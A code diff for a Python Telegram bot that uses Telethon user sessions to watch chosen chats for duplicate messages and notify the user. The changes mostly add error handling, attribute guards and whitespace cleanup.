         await context.bot.send_message(chat_id=chat_id, text=message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
 
@@ -1646,21 +1703,24 @@ async def show_categorized_chats(user_id: int, chat_id: int, message_id: int, ca
     client = user_clients[user_id]
 
     categorized_dialogs = []
-    async for dialog in client.iter_dialogs(limit=100):  # Limit to 100 for performance
-        entity = dialog.entity
+    try:
+        async for dialog in client.iter_dialogs(limit=100):  # Limit to 100 for performance
+            entity = dialog.entity
 
-        if category == "bots":
-            if isinstance(entity, User) and entity.bot:
-                categorized_dialogs.append(dialog)
-        elif category == "channels":
-            if isinstance(entity, Channel) and getattr(entity, "broadcast", False):
-                categorized_dialogs.append(dialog)
-        elif category == "groups":
-            if isinstance(entity, (Channel, Chat)) and not (isinstance(entity, Channel) and getattr(entity, "broadcast", False)):
-                categorized_dialogs.append(dialog)
-        elif category == "private":
-            if isinstance(entity, User) and not entity.bot:
-                categorized_dialogs.append(dialog)
+            if category == "bots":
+                if isinstance(entity, User) and getattr(entity, "bot", False):
+                    categorized_dialogs.append(dialog)
+            elif category == "channels":
+                if isinstance(entity, Channel) and getattr(entity, "broadcast", False):
+                    categorized_dialogs.append(dialog)
+            elif category == "groups":
+                if isinstance(entity, (Channel, Chat)) and not (isinstance(entity, Channel) and getattr(entity, "broadcast", False)):
+                    categorized_dialogs.append(dialog)
+            elif category == "private":
+                if isinstance(entity, User) and not getattr(entity, "bot", False):
+                    categorized_dialogs.append(dialog)
+    except Exception:
+        logger.exception("Failed to iterate dialogs for user %s", user_id)
 
     PAGE_SIZE = 10
     total_pages = max(1, (len(categorized_dialogs) + PAGE_SIZE - 1) // PAGE_SIZE)
@@ -1704,7 +1764,13 @@ async def show_categorized_chats(user_id: int, chat_id: int, message_id: int, ca
 
     keyboard.append([InlineKeyboardButton("🔙 Back to Categories", callback_data="chatids_back")])
 
-    await context.bot.edit_message_text(chat_list, chat_id=chat_id, message_id=message_id, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+    try:
+        await context.bot.edit_message_text(chat_list, chat_id=chat_id, message_id=message_id, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+    except Exception:
+        try:
+            await context.bot.send_message(chat_id=chat_id, text=chat_list, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+        except Exception:
+            pass
 
 
 # ---------- Optimized Monitoring Core ----------
@@ -1712,9 +1778,9 @@ async def update_monitoring_for_user(user_id: int):
     """Optimized monitoring update"""
     if user_id not in user_clients:
         return
-    
+
     client = user_clients[user_id]
-    
+
     # Remove existing handlers
     if user_id in handler_registered:
         for handler in handler_registered[user_id]:
@@ -1723,69 +1789,73 @@ async def update_monitoring_for_user(user_id: int):
             except Exception:
                 pass
         handler_registered[user_id] = []
-    
+
     # Get monitored chat IDs
     monitored_chat_ids = set()
+    # Ensure tasks_cache is up to date for this user
+    if not tasks_cache.get(user_id):
+        tasks_cache[user_id] = await db_call(db.get_user_tasks, user_id)
+
     user_tasks = tasks_cache.get(user_id, [])
     for task in user_tasks:
         monitored_chat_ids.update(task.get("chat_ids", []))
-    
+
     if not monitored_chat_ids:
         logger.info(f"No monitored chats for user {user_id}")
         return
-    
+
     # Create handler for each monitored chat
     for chat_id in monitored_chat_ids:
         await register_handler_for_chat(user_id, chat_id, client)
-    
+
     logger.info(f"Updated monitoring for user {user_id}: {len(monitored_chat_ids)} chat(s)")
 
 
 async def register_handler_for_chat(user_id: int, chat_id: int, client: TelegramClient):
     """Optimized chat handler registration"""
-    
+
     async def _monitor_chat_handler(event):
         try:
             await optimized_gc()
-            
+
             message = event.message
             if not message:
                 return
-            
+
             # Skip reaction messages
             if hasattr(message, 'reactions') and message.reactions:
                 return
-                
+
             message_text = event.raw_text or message.message
             if not message_text:
                 return
 
             sender_id = message.sender_id
             message_id = message.id
-            message_outgoing = message.out
+            message_outgoing = getattr(message, "out", False)
 
             logger.debug(f"Processing monitored chat {chat_id} for user {user_id}")
-            
+
             # Find tasks that monitor this chat
-            user_tasks = tasks_cache.get(user_id, [])
-            for task in user_tasks:
+            user_tasks_local = tasks_cache.get(user_id, [])
+            for task in user_tasks_local:
                 if chat_id not in task.get("chat_ids", []):
                     continue
-                    
+
                 settings = task.get("settings", {})
                 task_label = task.get("label", "Unknown")
-                
+
                 # Check outgoing message monitoring
                 if message_outgoing and not settings.get("outgoing_message_monitoring", True):
                     continue
-                    
+
                 # Check duplicate detection
                 if settings.get("check_duplicate_and_notify", True):
                     message_hash = create_message_hash(message_text, sender_id)
-                    
+
                     if is_duplicate_message(user_id, chat_id, message_hash):
                         logger.info(f"DUPLICATE DETECTED: User {user_id}, Task {task_label}, Chat {chat_id}")
-                        
+
                         # Auto reply
                         if settings.get("auto_reply_system", False) and settings.get("auto_reply_message"):
                             auto_reply_message = settings.get("auto_reply_message", "")
@@ -1795,11 +1865,12 @@ async def register_handler_for_chat(user_id: int, chat_id: int, client: Telegram
                                 logger.info(f"Auto reply sent for duplicate in chat {chat_id}")
                             except Exception as e:
                                 logger.exception(f"Error sending auto reply: {e}")
-                        
+
                         # Manual notification
                         if settings.get("manual_reply_system", True):
                             try:
                                 if notification_queue:
+                                    # Put a compact tuple to reduce memory footprint
                                     await notification_queue.put((user_id, task, chat_id, message_id, message_text, message_hash))
                                 else:
                                     logger.error("Notification queue not initialized!")
@@ -1808,10 +1879,10 @@ async def register_handler_for_chat(user_id: int, chat_id: int, client: Telegram
                             except Exception as e:
                                 logger.exception(f"Error queuing notification: {e}")
                         continue
-                    
+
                     # Store message hash
                     store_message_hash(user_id, chat_id, message_hash, message_text)
-                    
+
         except Exception as e:
             logger.exception(f"Error in monitor message handler for user {user_id}, chat {chat_id}: {e}")
 
@@ -1819,7 +1890,7 @@ async def register_handler_for_chat(user_id: int, chat_id: int, client: Telegram
         # Register handler
         client.add_event_handler(_monitor_chat_handler, events.NewMessage(chats=chat_id))
         client.add_event_handler(_monitor_chat_handler, events.MessageEdited(chats=chat_id))
-        
+
         handler_registered.setdefault(user_id, []).append(_monitor_chat_handler)
         logger.info(f"Registered handler for user {user_id}, chat {chat_id}")
     except Exception as e:
@@ -1844,7 +1915,7 @@ async def start_monitoring_for_user(user_id: int):
             logger.info(f"Loaded {len(user_tasks)} tasks for user {user_id}")
         except Exception as e:
             logger.exception(f"Error loading tasks for user {user_id}: {e}")
-    
+
     # Set up handlers
     await update_monitoring_for_user(user_id)
 
@@ -1853,11 +1924,11 @@ async def notification_worker(worker_id: int):
     """Optimized notification worker"""
     logger.info(f"Notification worker {worker_id} started")
     global notification_queue, BOT_INSTANCE
-    
+
     if notification_queue is None:
         logger.error("notification_worker started before queue initialized")
         return
-    
+
     if BOT_INSTANCE is None:
         logger.error("Bot instance not available for notification worker")
         return
@@ -1877,10 +1948,10 @@ async def notification_worker(worker_id: int):
             if not settings.get("manual_reply_system", True):
                 logger.debug(f"Manual reply system disabled for user {user_id}")
                 continue
-            
+
             task_label = task.get("label", "Unknown")
             preview_text = message_text[:100] + "..." if len(message_text) > 100 else message_text
-            
+
             notification_msg = (
                 f"🚨 **DUPLICATE MESSAGE DETECTED!**\n\n"
                 f"**Task:** {task_label}\n"
@@ -1889,14 +1960,15 @@ async def notification_worker(worker_id: int):
                 f"💬 **Reply to this message to respond to the duplicate!**\n"
                 f"(Swipe left on this message and type your reply)"
             )
-            
+
             try:
                 sent_message = await BOT_INSTANCE.send_message(
                     chat_id=user_id,
                     text=notification_msg,
                     parse_mode="Markdown"
                 )
-                
+
+                # Store notification mapping
                 notification_messages[sent_message.message_id] = {
                     "user_id": user_id,
                     "task_label": task_label,
@@ -1905,12 +1977,12 @@ async def notification_worker(worker_id: int):
                     "duplicate_hash": message_hash,
                     "message_preview": preview_text
                 }
-                
+
                 logger.info(f"✅ Sent duplicate notification to user {user_id} for chat {chat_id}")
-                
+
             except Exception as e:
                 logger.error(f"Failed to send notification to user {user_id}: {e}")
-                
+
         except Exception as e:
             logger.exception(f"Unexpected error in notification worker {worker_id}: {e}")
         finally:
@@ -1923,10 +1995,10 @@ async def notification_worker(worker_id: int):
 async def start_workers(bot):
     """Optimized worker startup"""
     global _workers_started, notification_queue, worker_tasks, BOT_INSTANCE
-    
+
     if _workers_started:
         return
-    
+
     BOT_INSTANCE = bot
     notification_queue = asyncio.Queue(maxsize=SEND_QUEUE_MAXSIZE)
 
@@ -1944,24 +2016,24 @@ async def restore_sessions():
     """Optimized session restoration"""
     logger.info("🔄 Restoring sessions...")
 
-    # Restore from USER_SESSIONS
+    # Restore from USER_SESSIONS (env)
     if USER_SESSIONS:
         logger.info(f"Found {len(USER_SESSIONS)} sessions in USER_SESSIONS env var")
         restore_tasks = []
-        
+
         for user_id, session_string in USER_SESSIONS.items():
             if user_id in user_clients:
                 continue
-            
+
             # Check authorization
             is_allowed_db = await db_call(db.is_user_allowed, user_id)
             is_allowed_env = (user_id in ALLOWED_USERS) or (user_id in OWNER_IDS)
-            
+
             if not (is_allowed_db or is_allowed_env):
                 continue
-            
+
             restore_tasks.append(restore_single_session(user_id, session_string, from_env=True))
-        
+
         if restore_tasks:
             await asyncio.gather(*restore_tasks, return_exceptions=True)
 
@@ -1974,34 +2046,34 @@ async def restore_sessions():
         users = []
         all_active = []
 
-    # Update caches
+    # Update caches (lightweight)
     for t in all_active:
         uid = t["user_id"]
         tasks_cache[uid].append({
-            "id": t["id"], 
-            "label": t["label"], 
-            "chat_ids": t["chat_ids"], 
+            "id": t["id"],
+            "label": t["label"],
+            "chat_ids": t["chat_ids"],
             "is_active": 1,
             "settings": t.get("settings", {})
         })
 
     logger.info(f"📊 Found {len(users)} logged in user(s) in database")
 
-    # Restore sessions in batches
+    # Restore sessions in batches to avoid bursts
     batch_size = 5
     for i in range(0, len(users), batch_size):
         batch = users[i:i + batch_size]
         restore_tasks = []
-        
+
         for user in batch:
             user_id = user["user_id"]
             session_data = user.get("session_data")
-            
+
             if user_id in user_clients or not session_data:
                 continue
-                
+
             restore_tasks.append(restore_single_session(user_id, session_data, from_env=False))
-        
+
         if restore_tasks:
             await asyncio.gather(*restore_tasks, return_exceptions=True)
             await asyncio.sleep(1)  # Small delay between batches
@@ -2025,18 +2097,18 @@ async def restore_single_session(user_id: int, session_data: str, from_env: bool
         if await client.is_user_authorized():
             user_clients[user_id] = client
             chat_entity_cache.setdefault(user_id, {})
-            
+
             me = await client.get_me()
-            
-            # Update database
+
+            # Update database (mark logged in)
             await db_call(db.save_user, user_id, None, me.first_name, session_data, True)
-            
+
             # Check if phone number is missing
             user = await db_call(db.get_user, user_id)
             if user and (not user.get("phone") or user.get("phone") == "Not connected"):
                 phone_verification_states[user_id] = True
                 logger.info(f"User {user_id} needs phone verification after session restore")
-            
+
             await start_monitoring_for_user(user_id)
             logger.info(f"✅ Restored session for user {user_id}")
         else:
@@ -2062,7 +2134,7 @@ async def adduser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ **Admin Only**\n\nThis command is only available to admins.", parse_mode="Markdown")
         return
 
-    text = update.message.text.strip()
+    text = (update.message.text or "").strip()
     parts = text.split()
 
     if len(parts) < 2:
@@ -2107,7 +2179,7 @@ async def removeuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await update.message.reply_text("❌ **Admin Only**\n\nThis command is only available to admins.", parse_mode="Markdown")
         return
 
-    text = update.message.text.strip()
+    text = (update.message.text or "").strip()
     parts = text.split()
 
     if len(parts) < 2:
@@ -2199,7 +2271,7 @@ async def listusers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Optimized test command"""
     user_id = update.effective_user.id
-    
+
     if user_id in phone_verification_states:
         await update.message.reply_text(
             "❌ **Phone Verification Required**\n\n"
@@ -2208,13 +2280,16 @@ async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown"
         )
         return
-    
+
     if user_id in user_clients and user_id in tasks_cache and len(tasks_cache[user_id]) > 0:
         if notification_queue:
             task = tasks_cache[user_id][0]
             test_hash = hashlib.md5(f"test_{time.time()}".encode()).hexdigest()[:12]
-            await notification_queue.put((user_id, task, -1000000000, 999, "This is a test duplicate message!", test_hash))
-            
+            try:
+                await notification_queue.put((user_id, task, -1000000000, 999, "This is a test duplicate message!", test_hash))
+            except Exception:
+                pass
+
             await update.message.reply_text(
                 f"🧪 **Test Notification Sent!**\n\n"
                 f"✅ A test notification has been queued.\n"
@@ -2256,7 +2331,7 @@ async def shutdown_cleanup():
             t.cancel()
         except Exception:
             pass
-    
+
     if worker_tasks:
         try:
             await asyncio.gather(*worker_tasks, return_exceptions=True)
@@ -2265,7 +2340,7 @@ async def shutdown_cleanup():
 
     # Disconnect clients in parallel
     disconnect_tasks = []
-    for uid, client in user_clients.items():
+    for uid, client in list(user_clients.items()):
         if uid in handler_registered:
             for handler in handler_registered[uid]:
                 try:
@@ -2273,11 +2348,12 @@ async def shutdown_cleanup():
                 except Exception:
                     pass
             handler_registered.pop(uid, None)
+        # call disconnect coroutines
         disconnect_tasks.append(client.disconnect())
-    
+
     if disconnect_tasks:
         await asyncio.gather(*disconnect_tasks, return_exceptions=True)
-    
+
     user_clients.clear()
     phone_verification_states.clear()
 
@@ -2298,8 +2374,11 @@ async def post_init(application: Application):
 
     logger.info("🔧 Initializing bot...")
 
-    await application.bot.delete_webhook(drop_pending_updates=True)
-    logger.info("🧹 Cleared webhooks")
+    try:
+        await application.bot.delete_webhook(drop_pending_updates=True)
+        logger.info("🧹 Cleared webhooks")
+    except Exception:
+        pass
 
     # Add owners from env
     if OWNER_IDS:
@@ -2327,7 +2406,7 @@ async def post_init(application: Application):
     async def _collect_metrics():
         try:
             nq = notification_queue.qsize() if notification_queue is not None else None
-            
+
             return {
                 "notification_queue_size": nq,
                 "worker_count": len(worker_tasks),
@@ -2368,14 +2447,14 @@ def _get_memory_usage_mb():
         import psutil
         process = psutil.Process()
         return round(process.memory_info().rss / 1024 / 1024, 2)
-    except ImportError:
+    except Exception:
         return None
 
 
 # ---------- Main ----------
 def main():
     global BOT_INSTANCE
-    
+
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not found")
         return
@@ -2404,25 +2483,25 @@ def main():
     application.add_handler(CommandHandler("listusers", listusers_command))
     application.add_handler(CommandHandler("test", test_command))
     application.add_handler(CallbackQueryHandler(button_handler))
-    
+
     # Message handlers in priority order
     application.add_handler(MessageHandler(
-        filters.TEXT & ~filters.COMMAND, 
+        filters.TEXT & ~filters.COMMAND,
         handle_phone_verification
     ), group=0)
-    
+
     application.add_handler(MessageHandler(
-        filters.TEXT & ~filters.COMMAND, 
+        filters.TEXT & ~filters.COMMAND,
         handle_notification_reply
     ), group=1)
-    
+
     application.add_handler(MessageHandler(
-        filters.TEXT & ~filters.COMMAND, 
+        filters.TEXT & ~filters.COMMAND,
         handle_auto_reply_message
     ), group=2)
-    
+
     application.add_handler(MessageHandler(
-        filters.TEXT & ~filters.COMMAND, 
+        filters.TEXT & ~filters.COMMAND,
         handle_login_process
     ), group=3)
 
